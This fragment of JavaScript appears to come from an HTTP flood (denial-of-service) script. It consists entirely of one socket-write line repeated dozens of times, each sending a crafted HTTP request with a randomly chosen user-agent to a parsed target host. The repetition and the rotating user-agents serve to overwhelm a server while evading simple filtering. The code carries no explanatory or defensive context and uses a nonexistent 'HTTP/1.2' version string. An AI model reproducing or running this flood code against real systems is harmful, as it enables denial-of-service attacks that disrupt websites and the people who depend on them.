s.write(kontol + ' ' + parsedTarget.host + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + uap[Math.floor(Math.random() * uap.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
s.write(kontol + ' ' + parsedTarget.host + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + uap[Math.floor(Math.random() * uap.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
s.write(kontol + ' ' + parsedTarget.host + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + uap[Math.floor(Math.random() * uap.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
s.write(kontol + ' ' + parsedTarget.host + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + uap[Math.floor(Math.random() * uap.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
s.write(kontol + ' ' + parsedTarget.host + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + uap[Math.floor(Math.random() * uap.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
s.write(kontol + ' ' + parsedTarget.host + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + uap[Math.floor(Math.random() * uap.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
s.write(kontol + ' ' + parsedTarget.host + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + uap[Math.floor(Math.random() * uap.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
s.write(kontol + ' ' + parsedTarget.host + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + uap[Math.floor(Math.random() * uap.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
s.write(kontol + ' ' + parsedTarget.host + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + uap[Math.floor(Math.random() * uap.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
s.write(kontol + ' ' + parsedTarget.host + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + uap[Math.floor(Math.random() * uap.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
s.write(kontol + ' ' + parsedTarget.host + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + uap[Math.floor(Math.random() * uap.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
s.write(kontol + ' ' + parsedTarget.host + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + uap[Math.floor(Math.random() * uap.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
s.write(kontol + ' ' + parsedTarget.host + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + uap[Math.floor(Math.random() * uap.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
s.write(kontol + ' ' + parsedTarget.host + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + uap[Math.floor(Math.random() * uap.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
s.write(kontol + ' ' + parsedTarget.host + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + uap[Math.floor(Math.random() * uap.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
s.write(kontol + ' ' + parsedTarget.host + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + uap[Math.floor(Math.random() * uap.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
s.write(kontol + ' ' + parsedTarget.host + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + uap[Math.floor(Math.random() * uap.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
s.write(kontol + ' ' + parsedTarget.host + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + uap[Math.floor(Math.random() * uap.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
s.write(kontol + ' ' + parsedTarget.host + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + uap[Math.floor(Math.random() * uap.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
s.write(kontol + ' ' + parsedTarget.host + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + uap[Math.floor(Math.random() * uap.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
s.write(kontol + ' ' + parsedTarget.host + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + uap[Math.floor(Math.random() * uap.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
s.write(kontol + ' ' + parsedTarget.host + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + uap[Math.floor(Math.random() * uap.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
s.write(kontol + ' ' + parsedTarget.host + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + uap[Math.floor(Math.random() * uap.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
s.write(kontol + ' ' + parsedTarget.host + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + uap[Math.floor(Math.random() * uap.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
s.write(kontol + ' ' + parsedTarget.host + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + uap[Math.floor(Math.random() * uap.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
s.write(kontol + ' ' + parsedTarget.host + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + uap[Math.floor(Math.random() * uap.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
s.write(kontol + ' ' + parsedTarget.host + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + uap[Math.floor(Math.random() * uap.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
s.write(kontol + ' ' + parsedTarget.host + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + uap[Math.floor(Math.random() * uap.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
s.write(kontol + ' ' + parsedTarget.host + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + uap[Math.floor(Math.random() * uap.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
s.write(kontol + ' ' + parsedTarget.host + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + uap[Math.floor(Math.random() * uap.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
s.write(kontol + ' ' + parsedTarget.host + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + uap[Math.floor(Math.random() * uap.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
s.write(kontol + ' ' + parsedTarget.host + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + uap[Math.floor(Math.random() * uap.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
s.write(kontol + ' ' + parsedTarget.host + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + uap[Math.floor(Math.random() * uap.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
s.write(kontol + ' ' + parsedTarget.host + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + uap[Math.floor(Math.random() * uap.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
s.write(kontol + ' ' + parsedTarget.host + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + uap[Math.floor(Math.random() * uap.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
s.write(kontol + ' ' + parsedTarget.host + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + uap[Math.floor(Math.random() * uap.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
s.write(kontol + ' ' + parsedTarget.host + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + uap[Math.floor(Math.random() * uap.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
s.write(kontol + ' ' + parsedTarget.host + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + uap[Math.floor(Math.random() * uap.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
s.write(kontol + ' ' + parsedTarget.host + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + uap[Math.floor(Math.random() * uap.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
s.write(kontol + ' ' + parsedTarget.host + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + uap[Math.floor(Math.random() * uap.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
s.write(kontol + ' ' + parsedTarget.host + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + uap[Math.floor(Math.random() * uap.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
s.write(kontol + ' ' + parsedTarget.host + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + uap[Math.floor(Math.random() * uap.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
s.write(kontol + ' ' + parsedTarget.host + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + uap[Math.floor(Math.random() * uap.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
s.write(kontol + ' ' + parsedTarget.host + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + uap[Math.floor(Math.random() * uap.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
s.write(kontol + ' ' + parsedTarget.host + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + uap[Math.floor(Math.random() * uap.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
s.write(kontol + ' ' + parsedTarget.host + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + uap[Math.floor(Math.random() * uap.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
s.write(kontol + ' ' + parsedTarget.host + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + uap[Math.floor(Math.random() * uap.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
s.write(kontol + ' ' + parsedTarget.host + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + uap[Math.floor(Math.random() * uap.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
s.write(kontol + ' ' + parsedTarget.host + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + uap[Math.floor(Math.random() * uap.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
s.write(kontol + ' ' + parsedTarget.host + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + uap[Math.floor(Math.random() * uap.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
s.write(kontol + ' ' + parsedTarget.host + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + uap[Math.floor(Math.random() * uap.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
s.write(kontol + ' ' + parsedTarget.host + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + uap[Math.floor(Math.random() * uap.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
s.write(kontol + ' ' + parsedTarget.host + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + uap[Math.floor(Math.random() * uap.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
s.write(kontol + ' ' + parsedTarget.host + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + uap[Math.floor(Math.random() * uap.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
s.write(kontol + ' ' + parsedTarget.host + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + uap[Math.floor(Math.random() * uap.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
s.write(kontol + ' ' + parsedTarget.host + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + uap[Math.floor(Math.random() * uap.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
s.write(kontol + ' ' + parsedTarget.host + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + uap[Math.floor(Math.random() * uap.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
s.write(kontol + ' ' + parsedTarget.host + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + uap[Math.floor(Math.random() * uap.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
s.write(kontol + ' ' + parsedTarget.host + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + uap[Math.floor(Math.random() * uap.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
